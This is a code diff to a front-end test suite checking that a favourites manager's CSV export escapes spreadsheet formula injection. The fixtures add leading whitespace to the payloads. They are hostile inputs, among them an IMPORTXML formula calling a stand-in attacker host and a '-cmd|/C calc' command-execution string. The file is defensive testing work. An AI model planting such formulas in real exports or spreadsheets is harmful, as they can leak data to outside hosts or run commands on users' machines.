@@ -201,10 +201,10 @@ describe('FavoritesManager', () => {
               {
                 _id: 'fellowship-1',
                 id: 'fellowship-1',
-                title: '=IMPORTXML("https://attacker.example","//a")',
+                title: ' =IMPORTXML("https://attacker.example","//a")',
                 awardAmount: '+SUM(1,1)',
-                applicationLink: '-cmd|/C calc',
-                contactEmail: '@attacker.example',
+                applicationLink: '\t-cmd|/C calc',
+                contactEmail: '\r@attacker.example',
                 isAcceptingApplications: true,
               },
             ],
@@ -220,7 +220,7 @@ describe('FavoritesManager', () => {
       </MemoryRouter>,
     );
 
-    await screen.findByText('=IMPORTXML("https://attacker.example","//a")');
+    await screen.findByText(/IMPORTXML/);
 
     fireEvent.click(screen.getByRole('button', { name: 'Export' }));
     fireEvent.click(screen.getByRole('button', { name: 'Export as CSV' }));
@@ -228,14 +228,14 @@ describe('FavoritesManager', () => {
     await waitFor(() => expect(exportedBlob).not.toBeNull());
     const csv = await exportedBlob!.text();
 
-    expect(csv).toContain('"\'=IMPORTXML(""https://attacker.example"",""//a"")"');
+    expect(csv).toContain('"\' =IMPORTXML(""https://attacker.example"",""//a"")"');
     expect(csv).toContain(`"'+SUM(1,1)"`);
-    expect(csv).toContain('"\'-cmd|/C calc"');
-    expect(csv).toContain('"\'@attacker.example"');
-    expect(csv).not.toContain('"=IMPORTXML');
+    expect(csv).toContain('"\'\t-cmd|/C calc"');
+    expect(csv).toContain('"\'\r@attacker.example"');
+    expect(csv).not.toContain('" =IMPORTXML');
     expect(csv).not.toContain('"+SUM');
-    expect(csv).not.toContain('"-cmd');
-    expect(csv).not.toContain('"@attacker');
+    expect(csv).not.toContain('"\t-cmd');
+    expect(csv).not.toContain('"\r@attacker');
 
     createObjectURL.mockRestore();
     revokeObjectURL.mockRestore();
